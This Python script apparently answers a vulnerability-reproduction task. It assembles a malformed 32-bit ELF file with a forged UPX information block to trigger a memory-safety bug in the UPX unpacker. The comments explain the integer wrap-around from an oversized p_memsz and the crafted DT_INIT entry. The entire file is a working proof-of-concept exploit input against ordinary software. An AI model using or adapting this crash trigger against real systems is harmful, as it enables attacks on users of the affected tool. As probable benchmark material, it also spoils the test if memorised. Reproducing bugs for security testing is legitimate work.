import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = bytearray()

        # Constants for ELF structure and values
        ehdr_size = 52
        phdr_size = 32
        dyn_size = 8
        
        phnum = 3
        page_size = 4096
        load_addr = 0x08048000
        
        # Offsets within the file
        phdr_table_offset = ehdr_size
        dyn_table_offset = phdr_table_offset + phnum * phdr_size
        upx_info_offset = dyn_table_offset + 2 * dyn_size
        
        # UPX header sizes
        l_info_size = 28
        p_info_size = 12
        b_info_size = 12
        num_blocks = 1
        upx_header_size = 12 + l_info_size + p_info_size + num_blocks * b_info_size
        
        unpadded_size = upx_info_offset + upx_header_size
        file_size = (unpadded_size + 15) & ~15
        lsize = 10 

        # --- ELF Header (Elf32_Ehdr) ---
        poc += struct.pack(
            '<16sHHIIIIIHHHHHH',
            b'\x7fELF\x01\x01\x01' + b'\x00' * 9,
            2,          # e_type (ET_EXEC)
            3,          # e_machine (EM_386)
            1,          # e_version
            load_addr,  # e_entry
            phdr_table_offset, # e_phoff
            0,          # e_shoff
            0,          # e_flags
            ehdr_size,  # e_ehsize
            phdr_size,  # e_phentsize
            phnum,      # e_phnum
            0,          # e_shentsize
            0,          # e_shnum
            0           # e_shstrndx
        )

        # --- Program Header Table (3 * Elf32_Phdr) ---
        # Phdr 0: PT_LOAD. A large p_memsz causes an integer wrap-around for xct_off calculation.
        poc += struct.pack(
            '<IIIIIIII',
            1,              # p_type (PT_LOAD)
            0,              # p_offset
            load_addr,      # p_vaddr
            load_addr,      # p_paddr
            file_size,      # p_filesz
            0xfffffffe,     # p_memsz
            5,              # p_flags (R-E)
            page_size       # p_align
        )

        # Phdr 1: PT_LOAD for UPX info block.
        poc += struct.pack(
            '<IIIIIIII',
            1,                          # p_type (PT_LOAD)
            upx_info_offset,            # p_offset
            load_addr + upx_info_offset,# p_vaddr
            load_addr + upx_info_offset,# p_paddr
            upx_header_size,            # p_filesz
            upx_header_size,            # p_memsz
            6,                          # p_flags (RW-)
            page_size                   # p_align
        )

        # Phdr 2: PT_DYNAMIC pointing to our crafted dynamic segment.
        poc += struct.pack(
            '<IIIIIIII',
            2,                          # p_type (PT_DYNAMIC)
            dyn_table_offset,           # p_offset
            load_addr + dyn_table_offset, # p_vaddr
            load_addr + dyn_table_offset, # p_paddr
            2 * dyn_size,               # p_filesz
            2 * dyn_size,               # p_memsz
            6,                          # p_flags (RW-)
            4                           # p_align
        )

        # --- Dynamic Segment (2 * Elf32_Dyn) ---
        # Dyn 0: DT_INIT entry. d_un.d_ptr makes unp_off = 0.
        poc += struct.pack(
            '<iI',
            12,         # d_tag (DT_INIT)
            load_addr   # d_un.d_ptr
        )
        # Dyn 1: DT_NULL to terminate the segment.
        poc += struct.pack(
            '<iI',
            0,          # d_tag (DT_NULL)
            0           # d_un.d_val
        )

        # --- UPX Information Block ---
        # UPX Signature
        poc += b'UPX!\x02\x00\x00\x00\x00\x00\x00\x00'

        # l_info struct
        poc += struct.pack(
            '<IHBBBBB13sI',
            0,              # l_checksum
            0x15,           # l_version
            1,              # l_format
            1,              # l_method
            0,              # l_level
            0,              # l_ubuf_sz
            0,              # l_sbuf_sz
            b'\0' * 13,     # l_unused
            file_size,      # l_filesize
        )

        # p_info struct
        poc += struct.pack(
            '<III',
            0,          # p_progid
            lsize,      # p_filesize (the `lsize` for the buffer)
            32768,      # p_blocksize
        )
        
        # b_info struct (for 1 block)
        poc += struct.pack(
            '<IIBBH',
            lsize,      # b_size
            0,          # b_cpos
            2,          # b_method
            0,          # b_level
            0,          # b_unused
        )
        
        # Pad file to the final size
        poc.extend(b'\x00' * (file_size - len(poc)))
        
        return bytes(poc)